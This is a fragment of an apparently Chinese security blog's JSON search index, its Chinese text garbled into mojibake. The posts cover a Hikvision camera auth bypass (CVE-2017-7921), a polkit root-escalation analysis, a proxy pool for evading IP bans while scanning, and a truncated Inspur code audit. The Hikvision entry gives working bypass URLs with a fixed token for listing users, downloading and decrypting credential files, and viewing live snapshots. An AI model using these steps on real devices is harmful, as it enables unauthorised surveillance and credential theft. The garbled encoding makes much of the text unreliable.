    "content"  : "HikvisionConfigurationFilesUnauthfofaï¼šapp=â€HIKVISION-è§†é¢‘ç›‘æ§â€HIKVISIONç›‘æ§è®¾å¤‡ç®¡ç†åå°å­˜åœ¨æœªæˆæƒï¼Œé€šè¿‡æ„é€ urlå¯ç»•è¿‡ç™»å½•æŸ¥çœ‹ç›‘æ§ï¼Œæ£€ç´¢æ‰€æœ‰ç”¨æˆ·å’Œé…ç½®æ–‡ä»¶ä¸‹è½½ã€‚æ„é€ urlä¸»è¦æ˜¯é€šè¿‡å¦‚ä¸‹çš„authå‚æ•°æ„é€ ç”Ÿæˆbase64åŠ å¯†å­—æ®µï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼šâœechoadmin:11|base64YWRtaW46MTEKæ£€ç´¢æ‰€æœ‰ç”¨æˆ·åŠå…¶è§’è‰²çš„åˆ—è¡¨http://{ip.addr}:{ip.port}/Security/users?auth=YWRtaW46MTEKè¿”å›xmlä¿¡æ¯ï¼š&lt;UserListversion=\"1.0\"&gt;&lt;Userversion=\"1.0\"&gt;&lt;id&gt;1&lt;/id&gt;&lt;userName&gt;admin&lt;/userName&gt;&lt;priority&gt;high&lt;/priority&gt;&lt;ipAddress&gt;0.0.0.0&lt;/ipAddress&gt;&lt;macAddress&gt;00:00:00:00:00:00&lt;/macAddress&gt;&lt;userLevel&gt;Administrator&lt;/userLevel&gt;&lt;/User&gt;&lt;/UserList&gt;ä¸‹è½½è´¦å·å¯†ç é…ç½®æ–‡ä»¶http://{ip.addr}:{ip.port}/System/configurationFile?auth=YWRtaW46MTEKâœfileconfigurationFileconfigurationFile:PGPSecretKey-å¦‚ä¸Šï¼Œæˆ‘ä»¬é…ç½®æ–‡ä»¶ä¸‹è½½å®Œæˆåå¯ä»¥çœ‹åˆ°æ˜¯PGPåŠ å¯†æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯¹æ–‡ä»¶è¿›è¡Œè§£å¯†æ‰å¯ä»¥æ‰¾åˆ°è´¦å·å¯†ç çš„é…ç½®ä¿¡æ¯ï¼›æ–‡ä»¶è§£å¯†å‡ºçš„è´¦å·å¯†ç å°±æ˜¯ç›‘æ§è®¾å¤‡åå°ç®¡ç†çš„è´¦å·å¯†ç ä¿¡æ¯ï¼Œæˆ‘ä»¬å¾—åˆ°ä¿¡æ¯ç›´æ¥ç™»å½•å³å¯ã€‚è§£å¯†è½¯ä»¶ç”¨æ³•åŠé“¾æ¥å¦‚ä¸‹ï¼š#Usage:Open[hikvision-decrypter.exe]onWindowsplatform:OpenConfigurationFile-&gt;Encrypted-&gt;DecryptData(DecryptingAES...)-&gt;(Successfullydecrypteddata)-&gt;SaveConfigurationFile.#Findpassindecrypteddataç”¨010-Editorç¨‹åºæ‰“å¼€decrypteddataæ–‡ä»¶.æ–‡ä»¶å†…æœç´¢adminå­—ç¬¦ä¸²ï¼Œå¦‚å·¦å›¾ï¼›Boom!Easytofindpassword!(admin:asdf1234)*æˆ‘ä»¬é€šè¿‡[Usage]æ¥è·å¾—çš„å¸å·å¯†ç ç™»å½•å³å¯ï¼Œæœ‰æœºä¼šä¼šä»ä»£ç è§’åº¦åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆå­˜åœ¨æœªæˆæƒè®¿é—®#ç›¸å…³é“¾æ¥ä¸€è§ˆè¡¨DescLinkDownloadHikvisionexechikvision-decrypter.exeandhereis:ReposDownloadconfigurationFileSampleconfigurationFileDownloadconfigurationFiledecry-SampleconfigurationFile-decryè·å–ç›‘æ§å¿«ç…§http://{ip.addr}:{ip.port}/onvif-http/snapshot?auth=YWRtaW46MTEKå½“å‰æ—¶é—´ä¸‹ç›‘æ§çš„å¿«ç…§å›¾ç‰‡å‚è€ƒCVE-2017-7921æµ·åº·å¨è§†æ‘„åƒå¤´ç®¡ç†åå°æœªæˆæƒHikvisionDecrypterä»¥ä¸Šã€‚"
  },

  {
    "title"    : "å®‰åº†é™¤è‰",
    "category" : "daily",
    "tags"     : "",
    "url"      : "/daily/2021/Weeding-in-Anqing/",
    "date"     : "Jun 27, 2021",
    "content"  : "ç‹—å°¾è‰ï¼ˆå­¦åï¼šSetariaviridisï¼‰ï¼Œåˆåç»¿ç‹—å°¾è‰ã€è°·è å­ã€ç‹—å°¾å·´è‰ã€‚ä¸€å¹´ç”Ÿè‰æœ¬æ¤ç‰©ï¼›ç§†ç›´ç«‹æˆ–åŸºéƒ¨è†æ›²ï¼Œé«˜30-100å˜ç±³ï¼›å¶ç‰‡æ‰å¹³ï¼Œç‹­æŠ«é’ˆå½¢æˆ–çº¿çŠ¶æŠ«é’ˆå½¢ï¼›åœ†é”¥èŠ±åºç´§å¯†å‘ˆåœ†æŸ±å½¢ï¼Œåˆšæ¯›ç²—ç³™ï¼Œé€šå¸¸ç»¿è‰²æˆ–è¤é»„è‰²ã€‚åŒå±æ¤ç‰©å¸¸è§çš„è¿˜æœ‰ï¼šå¤§ç‹—å°¾è‰ï¼ˆSetariafaberiï¼‰ç­‰ã€‚ç‹—å°¾è‰æ˜¯å°ç±³çš„ç¥–å…ˆã€‚ä¸ä¹‹å¤–å½¢ç›¸è¿‘çš„é‡‘è‰²ç‹—å°¾è‰ï¼ˆåŸS.glaucaï¼Œç°Pennisetumglaucuï¼‰å·²ç»ç§»å…¥ç‹¼å°¾è‰å±ï¼Œä¸ä¹‹éåŒå±æ¤ç‰©ã€‚ç‹—å°¾è‰çš„ç§å­é€‚ç”Ÿæ€§å¼ºï¼Œè€æ—±è€è´«ç˜ ï¼Œåœ¨é…¸æ€§æˆ–ç¢±æ€§åœŸå£¤å‡å¯ç”Ÿé•¿ï¼Œå¸¸è§äºå†œç”°ã€è·¯è¾¹ã€è’åœ°ã€‚å…¨çƒåˆ†å¸ƒå¹¿æ³›ï¼Œä¸­å›½å„åœ°å‡æœ‰åˆ†å¸ƒï¼Œä¸ºå¸¸è§ä¸»è¦æ‚è‰ã€‚éº¦ç±»ã€ç¨»ç±»ã€ç‰ç±³ã€æ—±ä½œç‰©æ˜“å—å…¶ä¾µå®³ï¼Œä¸ä½œç‰©äº‰å¤ºè‚¥åŠ›èƒ½åŠ›å¼ºï¼Œé€ æˆä½œç‰©å‡äº§ã€‚ä¸€æ¬¡å¶ç„¶çš„æœºä¼šï¼Œä¹˜ç€å·¥ä½œå›åˆ°å®‰åº†â€”â€”è¿™ä¸€æ¬¡æ˜¯æ¥è‡ªå®‰åº†æ•™ä½“è¡Œä¸šçš„æ”»é˜²æ¼”ç»ƒï¼Œå½“ç„¶ï¼šæœ¬åœ°åŒ–é˜Ÿä¼ç«äº‰èµ·æ¥è¿˜æ˜¯å¾ˆåƒåŠ›çš„ï¼Œä¸è¿‡ç¬¬ä¸€çš„ç»“æœä¹Ÿèƒ½è¯æ˜è¿™ä¸€å¹´æ¥çš„æˆæœã€è¿›æ­¥ï¼›å¿™é‡Œå·é—²ï¼Œæ¼”ç»ƒç»“æŸéšåç¬¬äºŒå¤©è·Ÿç€è€å¤´å­å›äº†è¶Ÿè€å®¶ã€‚#è€æˆ¿å­æ¯æ¬¡å›è€å®¶é¼»è…”å†…æ€»æ˜¯å……æ»¡äº†è…è´¥çš„å‘³é“ï¼Œæ°´æ³¥ã€ç°å°˜ã€èœ˜è››ç½‘ï¼Œä¸€åˆ‡ä¸€åˆ‡çš„è…è´¥æ°”æ¯æ€»æ˜¯ä¼šè®©äººæƒ³åˆ°ä¸‹é›¨å¤©ï¼Œä¸çŸ¥ä¸ºä½•æˆ‘æ€»æ˜¯å¾ˆäº«å—é›¨å¤œï¼Œç›´åˆ°çœ‹åˆ°äº†è¿™å¥ï¼šæˆ‘ä»¬çš„ç¥–å…ˆåœ¨é›¨å¤œæ„Ÿåˆ°å®‰å…¨ï¼Œå› ä¸ºé›¨å¤œé‡å…½é²œå°‘å‡ºæ¥è§…é£Ÿï¼Œè¿™æ ·çš„å€¾å‘éšåŸºå› ä¿ç•™åœ¨æˆ‘ä»¬çš„å¤§è„‘æ·±å¤„ï¼Œè®©æˆ‘ä»¬åœ¨é›¨å¤œæœ‰å®‰å…¨æ„Ÿã€‚"
  },

  {
    "title"    : "Polkit-CVE-2021-3560",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/polkit-CVE-2021-3560/",
    "date"     : "Jun 16, 2021",
    "content"  : "YouTubeBiliBiliä¸è‰¯è§†é¢‘åé¦ˆ&nbsp;|&nbsp;Inappropriatevideofeedback.åŸè§†é¢‘ä¸­ï¼Œæ¼æ´å‘ç°äºº[@KevinBackhouse]ç®€å•ä»‹ç»æ¼æ´åŸç†åå¯¹æ¼æ´è¿›è¡Œæ‰‹åŠ¨å¤ç°ï¼›è€Œæˆ‘ä»¬éœ€æ³¨æ„çš„æ˜¯ï¼šç›¸å…³è„šæœ¬1ç”¨æ³•ï¼šbashpolkit-CVE-2021-3560.shusernamepasswd*Tipsï¼šè¯¦ç»†è§†é¢‘å¯ç‚¹å‡»åŸè§†é¢‘é“¾æ¥è§‚çœ‹ï¼Œæˆ–è€…ï¼šBiliBili-CVE-2021-3560Linuxææƒæ¼æ´å¤ç°2å°½ç®¡ç”¨ä½œè€…çš„è¯æ¥è¯´æ˜¯Thevulnerabilityenablesanunprivilegedlocalusertogetarootshellonthesystem.Itâ€™seasytoexploitwithafewstandardcommandlinetoolsè€Œå¯¹äºæ¼æ´å¤ç°æœ¬èº«è€Œè¨€ï¼Œæˆ‘ä»¬ä¼¼ä¹å¹¶ä¸èƒ½ç™¾åˆ†ç™¾è§¦å‘æ¼æ´å¦‚æœæˆ‘ä»¬æ²¡æœ‰æ‰¾åˆ°çªé—¨ï¼Œæ­£å¦‚ä½œè€…è¯´çš„ï¼šIliketothinkthatitâ€™stheoreticallypossibletotriggerbysmashingCtrl+Catjusttherightmoment,butIâ€™veneversucceeded,soIdoitwithasmallamountofbashscriptinginstead.Youmightneedtorunthatafewtimes,andyoumightneedtoexperimentwiththenumberofmillisecondsinthedelayæ‰€ä»¥æœ‰äº†æœ¬æ–‡ã€‚æ¼æ´ç®€ä»‹è¯¥æ¼æ´å­˜åœ¨äºç³»ç»ŸæœåŠ¡Polkitä¸­ï¼Œå› ä¸ºPolkitè¢«Systemdæ‰€è°ƒç”¨ï¼Œå› æ­¤é»˜è®¤å®‰è£…äº†Systemdçš„å‘è¡Œç‰ˆéƒ½ä¼šä½¿ç”¨Polkitï¼›è¯¥æ¼æ´æˆå› æ˜¯æ‰§è¡Œdbus-sendå‘½ä»¤ååœ¨è®¤è¯å®Œæˆå‰å¼ºåˆ¶ç»ˆæ­¢å¼•å‘é”™è¯¯ï¼Œè€ŒPolkitæœªæ­£ç¡®å¤„ç†é”™è¯¯å¯¼è‡´å…è®¸æ— ç‰¹æƒçš„ç”¨æˆ·æ·»åŠ ä¸€ä¸ªsudoç”¨æˆ·ã€‚dbus&amp;polkitäº¤äº’æµç¨‹å›¾[*Tipsï¼šæ¥æºå›¾è§ä¸‹æ–¹å‚è€ƒ]3è™šçº¿ä¸Šæ–¹çš„ä¸¤ä¸ªè¿›ç¨‹â€”â€”dbus-sendå’ŒAuthAgentæ˜¯éç‰¹æƒç”¨æˆ·è¿›ç¨‹ã€‚çº¿ä¸‹çš„é‚£äº›æ˜¯ç‰¹æƒç³»ç»Ÿè¿›ç¨‹ã€‚ä¸­é—´æ˜¯dbus-daemonï¼Œå®ƒå¤„ç†æ‰€æœ‰çš„é€šä¿¡ï¼šå…¶ä»–å››ä¸ªè¿›ç¨‹é€šè¿‡å‘é€D-Busæ¶ˆæ¯æ¥ç›¸äº’é€šä¿¡ã€‚dbus-daemonåœ¨polkitçš„å®‰å…¨æ€§ä¸­æ‰®æ¼”ç€éå¸¸é‡è¦çš„è§’è‰²ï¼Œå› ä¸ºå®ƒä½¿å››ä¸ªè¿›ç¨‹èƒ½å¤Ÿå®‰å…¨åœ°é€šä¿¡å¹¶æ£€æŸ¥å½¼æ­¤çš„å‡­æ®ã€‚ä¾‹å¦‚ï¼Œå½“AuthAgentå‘polkitå‘é€èº«ä»½éªŒè¯cookieæ—¶ï¼Œå®ƒä¼šé€šè¿‡å°†å…¶å‘é€åˆ°org.freedesktop.PolicyKit1D-Busåœ°å€æ¥å®ç°ã€‚ç”±äºè¯¥åœ°å€ä»…å…è®¸ç”±æ ¹è¿›ç¨‹æ³¨å†Œï¼Œå› æ­¤ä¸å­˜åœ¨éç‰¹æƒè¿›ç¨‹æ‹¦æˆªæ¶ˆæ¯çš„é£é™©ã€‚æˆ‘ä»¬ä»å·¦è¾¹ç®­å¤´æŒ‡å‘æ–¹å‘åˆ°å³è¾¹ä¸€ä¸ªå‡¹å­—å½¢æ¥çœ‹æµç¨‹ï¼š4dbus-sendå‘½ä»¤è¡Œåå°è¯·æ±‚dbus-daemonå®ˆæŠ¤ç¨‹åºç„¶åè½¬å‘å‘Šè¯‰account-daemondbus-sendç¨‹åºè¯·æ±‚account-daemonå®ˆæŠ¤ç¨‹åºæ”¶åˆ°è¯·æ±‚è¿”å›ç¡®è®¤å­—ç»™dbus-daemonï¼ŒåŒæ—¶å‘ŠçŸ¥polkitï¼ˆæˆ‘ä»¬çš„ä¸»è§’ï¼‰account-daemonä»dbus-sendæ¥æ”¶D-Busæ¶ˆæ¯ï¼Œè¯¥æ¶ˆæ¯åŒ…æ‹¬å‘é€è€…çš„å”¯ä¸€æ€»çº¿åç§°ã€‚polkitè¿”å›dbus-daemonå®ˆæŠ¤ç¨‹åºç¡®è®¤è¯·æ±‚ï¼Œæœ€ç»ˆåˆ°è¾¾AuthAgentè®¤è¯ç«¯polkitå‘dbus-daemonè¯¢é—®è¿æ¥çš„UIDå¦‚æœè¿æ¥çš„UIDä¸ºâ€™0â€™ï¼Œåˆ™polkitç«‹å³æˆæƒè¯¥è¯·æ±‚ã€‚å¦åˆ™ï¼Œå®ƒä¼šå‘èº«ä»½éªŒè¯ä»£ç†å‘é€å…è®¸æˆæƒè¯·æ±‚çš„ç®¡ç†å‘˜ç”¨æˆ·åˆ—è¡¨ã€‚èº«ä»½éªŒè¯ä»£ç†æ‰“å¼€ä¸€ä¸ªå¯¹è¯æ¡†ä»¥ä»ç”¨æˆ·é‚£é‡Œè·å–å¯†ç ã€‚èº«ä»½éªŒè¯ä»£ç†å°†å¯†ç å‘é€ç»™polkitï¼Œpolkitå°†â€œæ˜¯â€å›å¤å‘é€å›å¸æˆ·å®ˆæŠ¤ç¨‹åºï¼Œaccount-daemonåˆ›å»ºæ–°çš„ç”¨æˆ·å¸æˆ·ã€‚æ˜¾è€Œæ˜“è§ï¼šé—®é¢˜æµç¨‹åœ¨æœ€åä¸€æ®µï¼Œæˆ‘ä»¬é€šè¿‡æ¼æ´å‘ç°è€…åšå®¢å·²çŸ¥å…³é”®åœ¨äºKillæ‰dbus-sendå‘½ä»¤å¯¼è‡´äº†èº«ä»½éªŒè¯ç»•è¿‡ï¼Œä¸ºä»€ä¹ˆï¼Ÿæ¢è€Œè¨€ä¹‹ï¼Œæ¼æ´å‡ºç°åœ¨ç¬¬ä¸‰æ­¥éª¤çš„ç¬¬äºŒå°æ­¥ï¼ŒæŒ–æ˜æ€è·¯æ˜¯ä»€ä¹ˆï¼Ÿåœ¨æ­¤ä¹‹å‰æˆ‘ä»¬ç®€å•äº†è§£ä¸€ä¸‹polkitï¼Œæˆ‘è®¤ä¸ºå¯ä»¥æŠŠå®ƒæƒ³åƒæˆsudoè®¤è¯æœºåˆ¶çš„å¯è§†åŒ–ç•Œé¢ï¼Œå½“æˆ‘ä»¬çš„å½“å‰æ“ä½œéœ€è¦æ›´å¤šæƒé™æ—¶é‚£ä¹ˆå°±ä¼šè§¦å‘polkitçš„è®¤è¯æœºåˆ¶ï¼špkexec$pkexecid====AUTHENTICATINGFORorg.freedesktop.policykit.exec===Authenticationisneededtorun`/usr/bin/id'asthesuperuserAuthenticatingas:bin4xin,,,(ingeek)Password:polkit-agent-abouter-1:errorresponsetoPolicyKitdaemon:GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed:Nosessionforcookie====AUTHENTICATIONFAILED===Errorexecutingcommandasanotheruser:NotauthorizedThisincidenthasbeenreported.#pkexecwhoamirootä½œè€…æåˆ°ï¼šåœ¨ç¬¬ä¸‰æ­¥éª¤çš„ç¬¬ä¸€å°æ­¥ä¸­è¯¢é—®dbus-daemonçš„å‡½æ•°ä¸­ä»£ç å­˜ç–‘ï¼šstaticgbooleanpolkit_system_bus_name_get_creds_sync(PolkitSystemBusName*system_bus_name,guint32*out_uid,guint32*out_pid,GCancellable*cancellable,GError**error)å…·ä½“çš„ä»£ç åˆ†æå¯ä»¥å‚è€ƒåŸåšå®¢ï¼Œæˆ‘ä»¬è¿™é‡Œå°±ä¸åšä¸è¿‡å¤šçš„æ¬è¿å’Œç¿»è¯‘ã€‚æ‰€ä»¥å¦‚ä¸Šæˆ‘ä»¬å¯ä»¥å¾—åˆ°çš„æ˜¯polkitåœ¨è¯¢é—®dbus-daemonè¿‡ç¨‹ä¸­æœªè¿›è¡Œé”™è¯¯æ£€æŸ¥ï¼Œå¯¼è‡´åœ¨è¿è¡Œè´¨è¯¢çš„è¿‡ç¨‹ä¸­å¯ä»¥é€šè¿‡ä¸€äº›å¯æ§æ‰‹æ®µç»•è¿‡è®¤è¯æœºåˆ¶ï¼šThebugisinthissnippetofcodeincheck_authorization_sync:Noticethatthevalueoferrorisnotchecked.Pocä»£ç éœ€è§£å†³çš„å¦‚ä¸‹ï¼šé‡å¤è¿è¡Œpayloadï¼Œå‡½æ•°æ£€æµ‹æ˜¯å¦æ·»åŠ ç”¨æˆ·payloadæ˜¯å¦æˆåŠŸï¼›ä¿®æ”¹payloadï¼Œè®¡ç®—killpolkitè¿›ç¨‹çš„æ—¶é—´ï¼›è¾“å‡ºæ·»åŠ æˆåŠŸå¸å·å¯†ç ã€‚Pocä»£ç å®éªŒç¯å¢ƒUbuntu20.04ingeek@ubuntu:~$/etc/init.d/dbusstatusâ—dbus.service-D-BusSystemMessageBusLoaded:loaded(/lib/systemd/system/dbus.service;static;vendorpreset:enabled)Active:active(running)sinceTue2021-06-1523:00:47PDT;1h26minagoTriggeredBy:â—dbus.socketDocs:man:dbus-daemon(1)MainPID:875(dbus-daemon)Tasks:1(limit:4618)Memory:5.4MCGroup:/system.slice/dbus.serviceâ””â”€875/usr/bin/dbus-daemon--system--address=systemd:--nofork--å‚è€ƒä»¥ä¸Šã€‚hakivvi/CVE-2021-3560Â &#8617;CVE-2021-3560Linuxææƒæ¼æ´å¤ç°Â &#8617;Privilegeescalationwithpolkit:HowtogetrootonLinuxwithaseven-year-oldbugÂ &#8617;LinuxsystemservicebugletsyougetrootonmostmoderndistrosÂ &#8617;"
  },

  {
    "title"    : "scylla æ­å»ºæ­¥éª¤",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Thousand-people-Thousand-faces-Red-team-penetration-agent-pool-based-on-scylla/",
    "date"     : "Jun 4, 2021",
    "content"  : "åŸºäºscyllaçš„ä»£ç†æ± ä¼˜ç‚¹ï¼šæ‰‹å·¥burpæ¸—é€çš„åŒæ—¶ï¼Œåå°Xrayæ‰«æç¼ºç‚¹ï¼šä¼šè¢«å°IPï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªä»£ç†æ± æˆ–æœºåœºä½œä¸ºXrayçš„å‡ºå£è¿è¡Œé€»è¾‘ï¼šä¸€ã€ScyllaAgentPoolç›®å‰åœ¨Ubuntu18ã€Darwinä¸‹æµ‹è¯•æˆåŠŸScyllaV1.1.7DownloadScyllaä¸­æ–‡æ–‡æ¡£2021å¹´6æœˆ10æ—¥æ˜ŸæœŸå››15æ—¶56åˆ†53ç§’CSTWINDOWSæµ‹è¯•ç¯å¢ƒWindows10æµ‹è¯•æ’å‘å¤±è´¥ä¸æ¨èwinç¯å¢ƒä¸‹éƒ¨ç½²1x01Ubuntu&amp;Darwinâœcdscylla-1.1.7âœpython3-mpipinstall-rrequirements.txtâœexporthttp_proxy=\"http://127.0.0.1:8082\";exportHTTP_PROXY=\"http://127.0.0.1:8082\";exporthttps_proxy=\"http://127.0.0.1:8082\";exportHTTPS_PROXY=\"http://127.0.0.1:8082\"#éœ€åŠ ä¸Šç§‘å­¦ä»£ç†ï¼Œå¦åˆ™æŠ¥é”™WARNING:[Worker]Cannotgetthisurl:#https://raw.githubusercontent.com/a2u/free-proxy-list/master/free-proxy-list.txtâœpython3-mscylla2021-06-04-09:57:56DEBUG:createnewdbconnection2021-06-04-09:57:57INFO:Schedulerstarts...2021-06-04-09:57:57DEBUG:feed16providers...2021-06-04-09:57:57INFO:Startpythonscheduler2021-06-04-09:57:57INFO:worker_processstarted2021-06-04-09:57:57INFO:validator_threadstarted2021-06-04-09:57:57INFO:Startthewebserver[2021-06-0409:57:57+0800][3848][INFO]Goin'Fast@http://0.0.0.0:8899[2021-06-0409:57:57+0800][3848][ERROR]UnabletostartserverÂ·Â·Â·Â·Â·Â·Â·Â·Â·2021-06-04-10:04:20DEBUG:Getaproviderfromtheproviderqueue:ProxyNovaProvider2021-06-04-10:04:20DEBUG:Catchrequests.Timeoutforproxyip:110.76.148.2422021-06-04-10:04:21DEBUG:Catchrequests.Timeoutforproxyip:160.19.232.852021-06-04-10:04:22INFO:ProxyNovaProvider:feed0potentialproxiesintothevalidatorqueue2021-06-04-10:04:23INFO:PubproxyProvider:feed5potentialproxiesintothevalidatorqueueçœ‹åˆ°PubproxyProviderè¿”å›æä¾›çš„ä»£ç†ipå³å¯ç”¨ï¼š#çœŸå®ipâœcurlhttp://api.ipify.org60.168.247.60#ä»£ç†æ± ipâœcurlhttp://api.ipify.org-xhttp://127.0.0.1:808112.186.206.841x02Windows10Couldnotfindaversionthatsatisfiestherequirementpycurl==7.43.0.11ã€windowspipæ¢æº2ã€ä¿®æ”¹requirements.txtpycurl==7.43.0.53ã€python3-mpipinstallpycurl==7.43.0.54ã€python3-mpipinstall-rrequirements.txtBuildingwheelformultidict(PEP517)â€¦error#è¯¦ç»†æŠ¥é”™ï¼šerror:MicrosoftVisualC++14.0orgreaterisrequired.Getitwith\"MicrosoftC++BuildTools\":https://visualstudio.microsoft.com/visual-cpp-build-tools/----------------------------------------ERROR:Failedbuildingwheelformultidictå®‰è£…VSC++14ä»¥ä¸Šç‰ˆæœ¬å³å¯python3-mpipinstall--upgradesetuptoolsMicrosoftBuildToolsforVisualStudio2019é›†æˆå¼€å‘ç¯å¢ƒ(IDE)ä¸‹è½½Communityç‰ˆï¼›é€‰æ‹©ç»„ä»¶å‚è€ƒï¼šnpminstallC:\\Windows&gt;npm-v7.15.1C:\\Windows&gt;node-vv16.3.0npmERR!code1npmERR!pathC:\\Users\\bin4xin\\Desktop\\scylla\\node_modules\\deasyncnpmERR!commandfailednpmERR!commandC:\\Windows\\system32\\cmd.exe/d/s/cnode./build.jsnpmERR!gypinfoitworkedifitendswithoknpmERR!gypinfousingnode-gyp@3.8.0npmERR!gypinfousingnode@16.3.0|win32|ia32npmERR!gypERR!configureerrornpmERR!gypERR!stackError:Commandfailed:C:\\Python39\\python.EXE-cimportsys;print\"%s.%s.%s\"%sys.version_info[:3];npmERR!gypERR!stackFile\"&lt;string&gt;\",line1npmERR!gypERR!stackimportsys;print\"%s.%s.%s\"%sys.version_info[:3];çœ‹åˆ°ä¸Šé¢çš„C:\\Python39\\python.EXE-cimportsys;print\"%s.%s.%s\"%sys.version_info[:3];æŠ¥é”™ï¼Œå®é™…ä¸Šæ­£ç¡®çš„å†™æ³•åº”è¯¥æ˜¯ï¼šType\"about\",\"copyright\",\"credits\"or\"license\"formoreinformation.&gt;&gt;&gt;importsys&gt;&gt;&gt;print(\"%s.%s.%s\"%sys.version_info[:3])3.8.5æƒ³åˆ°å‡ ç§å¯èƒ½æ€§ï¼š1ã€scyllapythonçš„æºç ï¼›2ã€npmå®‰è£…æºç ä¾èµ–å¯¼è‡´ï¼›é¡¿æ—¶è§‰å¾—è¿™é‡Œé¢çš„å‘æ·±ä¸å¯æµ‹æˆ‘æŠŠæ¡ä¸ä½ï¼Œé‚æ”¾å¼ƒåœ¨windowså¹³å°æ­å»ºï¼›ç”±äºåœ¨macosOSã€Ubuntuä¸Šæ­å»ºæˆåŠŸï¼Œåªèƒ½èµ°æ›²çº¿æ•‘å›½æ–¹å¼ï¼Œåœ¨dockerä¸­å°è¯•ï¼›BurpSuitewithAgentPoolProxyListeners-&gt;127.0.0.18081ç«¯å£https://www.rmccurdy.com/.scripts/proxy/good.txtpassive-scan-clientâœgitclonehttps://github.com/c0ny1/passive-scan-clientâœcdpassive-scan-clientâœmvnpackageâœlstarget/archive-tmpmaven-archiverpassive-scan-client-0.1.jarclassesmaven-statusgenerated-sourcespassive-scan-client-0.1-jar-with-dependencies.jarpassive-scan-client-0.1-jar-with-dependencies.jarå¯¼å…¥BurpSuiteï¼šExtender-&gt;Extensions-&gt;Add{/path-to-taget-dir/passive-scan-client-0.1-jar-with-dependencies.jaré…ç½®è½¬å‘æ‰«æç«¯å£xraywithAgentPoolæ‰«æé…ç½®æµè§ˆå™¨é…ç½®ä»£ç†http(s)://127.0.0.1:12344BurpSuiteç›‘å¬12344passive-scan-clientå¦‚ä¸Šé…ç½®xrayå¦‚ä¸‹é…ç½®å³å¯âœnohup./xraywebscan--listen127.0.0.1:7777--html-outputoutput/2021-05/2021-05-28.html&amp;âœtail-fnohup.outæ•ˆæœï¼šå‚è€ƒburpæµé‡è½¬å‘æ’ä»¶PSC+xray/w13scanå®ç°è¢«åŠ¨æ‰«æxray+passive-scan-clienté…ç½®ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "æµªæ½®ClusterEngineV4.0ä»£ç å®¡è®¡å†ç¨‹",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/inspur-Cluster-Engine-V4.0-code-aduit-walkthrough/",
    "date"     : "May 21, 2021",
    "content"  : "CNVD-2021-39845-æµªæ½®ClusterEngineV4.0å­˜åœ¨é€»è¾‘ç¼ºé™·æ¼æ´2021å¹´5æœˆ21æ—¥æ˜ŸæœŸæ—¥00æ—¶11åˆ†58ç§’CSTæœ€è¿‘ä¸€ç›´åœ¨çœ‹ä»£ç ï¼Œæ­£å¥½å‰ä¸¤å¤©åœ¨ç½‘ä¸Šå†²æµªçš„æ—¶å€™çœ‹åˆ°æµªæ½®çš„ä¸€ä¸ªRCEï¼Œå°±æ‹¿è¿‡æ¥åˆ†æä¸€ä¸‹è¯•è¯•çœ‹2021å¹´5æœˆ31æ—¥æ˜ŸæœŸä¸€22æ—¶55åˆ†49ç§’CSTä¸Šä¼ ç›¸å…³ä»£ç è‡³bigger-than-biggerä»“åº“ï¼šç‚¹å‡»æŸ¥çœ‹ç›¸å…³ä»£ç å…ˆçœ‹web.xmlå®šä¹‰çš„servletï¼›&lt;servlet&gt;&lt;servlet-name&gt;login&lt;/servlet-name&gt;&lt;servlet-class&gt;com.inspur.tsce4.login.Servlet&lt;/servlet-class&gt;&lt;/servlet&gt;æŒ‡å‘com.inspur.tsce4.login.Servletç±»ï¼Œç›´æ¥å»çœ‹loginï¼šWEB-INF/classes/com/inspur/tsce4/login/Servletç±»ï¼špublicclassServletextendsHttpServlet{publicServlet(){}publicvoiddoPost(HttpServletRequestrequest,HttpServletResponseresponse)throwsServletException,IOException{request.setCharacterEncoding(\"utf-8\");Managementmanage=newManagement(request,response);manage.doResponse();}publicvoiddoGet(HttpServletRequestrequest,HttpServletResponseresponse)throwsServletException,IOException{this.doPost(request,response);}}ç»§æ‰¿äº†HttpServletï¼Œdopostæ–¹æ³•è°ƒç”¨Managementï¼špublicclassManagement{HttpServletRequestrequest;HttpServletResponseresponse;Commandcommand=newCommand();}æˆ‘ä¸ªäººä¸å¤ªå–œæ¬¢è´´å¤§æ®µä»£ç ï¼Œè‡ªå·±å†™ç€ç´¯ï¼Œçœ‹çš„äººä¹Ÿç´¯ï¼Œå› ä¸ºä»£ç åªæ›´åƒæ˜¯æˆ‘ä»¬ç”Ÿæ´»ä¸­èŠå¤©æ—¶å€™çš„äº’åŠ¨æ‰‹åŠ¿ï¼Œä¸€å®šæ˜¯è¾…åŠ©ä½œç”¨è€Œä¸æ˜¯è¡¨è¾¾ä¸»é¢˜ï¼›äºæ˜¯æˆ‘ä¾¿å¤§è‡´ç”»äº†ä¸€ä¸‹æˆ‘ç†è§£çš„webè®¤è¯Javaä»£ç è·³è½¬é€»è¾‘ï¼Œæ–¹ä¾¿ç†è§£ï¼šcommand()-&gt;å¯¹åº”æ˜¯è¿è¡ŒæœåŠ¡å™¨ä¸Šçš„user_auth.shè„šæœ¬ï¼šç‚¹å‡»ä»¥æŸ¥çœ‹ä»£ç æ¥çœ‹çœ‹ä»£ç ä¸»è¦è¿è¡Œé€»è¾‘ï¼Œä¸»è¦ä¸ºä»¥ä¸‹é€»è¾‘ï¼šè¿è¡Œç¨‹åºå…ˆåˆ¤æ–­ä¼ å…¥å‚æ•°ä¸ªæ•°ç´§æ¥ç€å¯¹ç¬¬ä¸€ä¸ªä¼ å…¥å‚æ•°è¿›è¡Œç®€å•çš„ç‰¹æ®Šå­—ç¬¦è¿‡åè¿›è¡Œæ¯”å¯¹ï¼Œä»£ç å¦‚ä¸‹ï¼šunameecho$1|awk-F\"\"'{for(i=1;i&lt;=NF;i++){if($i~/[a-zA-Z0-9_]/){str=$i;str1=(str1str)}}printstr1}'if[a\"$uname\"b!=a\"$1\"b];thenechotheuser$1formatisillegalechoerror:1exit1;fi#ç®€å•åšäº†ä¸€ä¸ªè¿‡æ»¤å®éªŒï¼Œä½†æ˜¯ä¸€å¯¹ç¬¦å·å¦‚()''ç­‰éƒ½æ— 